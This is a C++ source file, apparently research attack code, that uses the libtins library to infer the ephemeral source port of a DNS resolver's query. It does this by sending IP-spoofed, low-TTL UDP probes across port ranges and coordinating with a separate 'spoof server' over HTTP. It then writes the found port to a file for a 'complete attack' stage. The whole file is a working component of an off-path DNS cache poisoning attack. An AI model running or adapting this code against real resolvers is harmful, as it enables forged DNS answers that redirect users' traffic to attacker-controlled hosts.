#include <algorithm>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <map>
#include <set>
#include <string>
#include <sys/time.h>
#include <thread>
#include <unistd.h>

#include <tins/tins.h>

#include "../../TCP-hijacking/1-infer_port/httplib.h"

using namespace std;
using namespace Tins;

namespace {
const uint16_t kStartPort = 32768;
const uint16_t kEndPort = 65530;
const int kPortSearchRange = 2000;
const int kConfirmTimes = 3;
const char kProbePayload[] = "dns-verify";
const size_t kTrackedPortCount = 40000;
}  // namespace

set<uint16_t> recv_dports;
pthread_mutex_t mut;

IPv4Address remote_dns_ip, attacker_private_ip;
uint16_t remote_dns_port;
uint16_t guessed_client_port;
string packet_iface;
string sniff_filter;

bool guess_port_finished = false;
bool debug = false;

IP udp_pkts[kTrackedPortCount];

double __get_us(struct timeval t) {
    return (t.tv_sec * 1000000 + t.tv_usec);
}

void trigger_spoof_server_send_linear_responses(httplib::Client& cli,
                                                uint16_t begin_port) {
    if (debug) {
        cout << "trigger_spoof_server_send_linear_responses" << endl;
    }
    auto res = cli.Get("/begin_port/" + to_string(begin_port));
    if (debug && res) {
        cout << res->status << ", " << res->body << endl;
    }
}

void trigger_spoof_server_send_targeted_responses(httplib::Client& cli,
                                                  uint16_t base_port,
                                                  const string& all_increment) {
    if (debug) {
        cout << "trigger_spoof_server_send_targeted_responses" << endl;
    }
    httplib::Params params;
    params.emplace("base_port", to_string(base_port));
    params.emplace("all_increment", all_increment);
    auto res = cli.Post("/possible_ports", params);
    if (debug && res) {
        cout << res->status << ", " << res->body << endl;
    }
}

void save_port_to_file() {
    ofstream fout("../complete_attack/PORT_INFER_RESULT");
    fout << "source-port: " << guessed_client_port << endl;
}

void guess_port(httplib::Client& cli) {
    PacketSender sender;
    NetworkInterface iface(packet_iface);
    guess_port_finished = false;

    struct timeval start_time, stop_time;
    gettimeofday(&start_time, NULL);

    for (uint16_t begin_port = kStartPort; begin_port < kEndPort;
         begin_port += kPortSearchRange) {
        if (guess_port_finished || begin_port < 10000) {
            break;
        }

        set<uint16_t> left_ports;
        const uint16_t max_port =
            (begin_port + kPortSearchRange) < kEndPort ? begin_port + kPortSearchRange
                                                       : kEndPort;
        cout << "search range:[" << begin_port << ", " << max_port << "]" << endl;
        for (uint16_t port = begin_port; port < max_port; port++) {
            left_ports.insert(port);
        }

        map<uint16_t, int> port_to_count;
        bool linear_packets_sent = false;

        while (true) {
            set<uint16_t> sent_ports;
            if (!linear_packets_sent) {
                for (set<uint16_t>::iterator it = left_ports.begin();
                     it != left_ports.end(); ++it) {
                    const uint16_t port = *it;
                    sender.send(udp_pkts[port - kStartPort], iface);
                    sent_ports.insert(port);
                    usleep(10);
                }
                if (debug) {
                    cout << "send linear UDP probes" << endl;
                }
                trigger_spoof_server_send_linear_responses(cli, begin_port);
                linear_packets_sent = true;
            } else {
                const uint16_t base_port = *left_ports.begin();
                uint16_t cur_port = base_port;
                string all_increment;
                for (set<uint16_t>::iterator it = left_ports.begin();
                     it != left_ports.end(); ++it) {
                    const uint16_t port = *it;
                    sender.send(udp_pkts[port - kStartPort], iface);
                    sent_ports.insert(port);
                    all_increment += to_string(port - cur_port) + ",";
                    cur_port = port;
                    usleep(10);
                }
                if (debug) {
                    cout << "send targeted UDP probes" << endl;
                }
                trigger_spoof_server_send_targeted_responses(cli, base_port,
                                                             all_increment);
            }

            set<uint16_t> recv_snapshot;
            pthread_mutex_lock(&mut);
            recv_snapshot = recv_dports;
            pthread_mutex_unlock(&mut);

            left_ports.clear();
            set_difference(sent_ports.begin(), sent_ports.end(), recv_snapshot.begin(),
                           recv_snapshot.end(),
                           inserter(left_ports, left_ports.begin()));

            if (debug) {
                cout << "left_ports.size(): " << left_ports.size() << endl;
            }

            if (left_ports.empty()) {
                cout << "all ports are open" << endl;
                break;
            }

            if (left_ports.size() == 1) {
                const uint16_t temp_port = *left_ports.begin();
                port_to_count[temp_port] += 1;
                if (debug) {
                    cout << "find port: " << temp_port << " for "
                         << port_to_count[temp_port] << " times" << endl;
                }
                if (port_to_count[temp_port] >= kConfirmTimes) {
                    guess_port_finished = true;
                    guessed_client_port = temp_port;
                    cout << "find the DNS source-port: " << guessed_client_port
                         << endl;
                    save_port_to_file();

                    if (debug) {
                        gettimeofday(&stop_time, NULL);
                        cout << "time used to guess the DNS source port: "
                             << (__get_us(stop_time) - __get_us(start_time)) / 1000
                             << " ms" << endl;
                    }
                    break;
                }
            }
        }
    }
}

bool callback(const PDU& pdu) {
    const IP& ip = pdu.rfind_pdu<IP>();
    const UDP& udp = pdu.rfind_pdu<UDP>();

    if (ip.protocol() == 17 && ip.src_addr() == remote_dns_ip &&
        ip.dst_addr() == attacker_private_ip && udp.sport() == remote_dns_port) {
        pthread_mutex_lock(&mut);
        if (!guess_port_finished) {
            recv_dports.insert(udp.dport());
        }
        pthread_mutex_unlock(&mut);
    }
    return true;
}

void sniff_packets() {
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
    config.set_immediate_mode(true);
    Sniffer(packet_iface, config).sniff_loop(callback);
}

int main(int argc, char** argv) {
    if (argc != 7) {
        cout << "wrong number of args ---> "
             << "(attacker_private_ip, remote_dns_ip, remote_dns_port, "
             << "spoof_server_ip, spoof_server_port, packet_iface)" << endl;
        return 0;
    }

    attacker_private_ip = IPv4Address(argv[1]);
    remote_dns_ip = IPv4Address(argv[2]);
    remote_dns_port = atoi(argv[3]);
    const string spoof_server_ip = argv[4];
    const string spoof_server_port = argv[5];
    packet_iface = argv[6];

    const string spoof_server_config =
        "http://" + spoof_server_ip + ":" + spoof_server_port;
    sniff_filter = "udp and src host " + string(argv[2]) + " and src port " +
                   string(argv[3]);

    for (int i = 0; i < kEndPort - kStartPort; i++) {
        udp_pkts[i] = IP(remote_dns_ip, attacker_private_ip) /
                      UDP(remote_dns_port, kStartPort + i) /
                      RawPDU(string(kProbePayload));
        udp_pkts[i].rfind_pdu<IP>().ttl(6);
    }

    httplib::Client cli(spoof_server_config);
    cli.set_keep_alive(true);
    cli.set_read_timeout(10, 0);

    pthread_mutex_init(&mut, NULL);
    thread sniff_thread(sniff_packets);
    guess_port(cli);
    sleep(1);
    sniff_thread.detach();

    return 0;
}
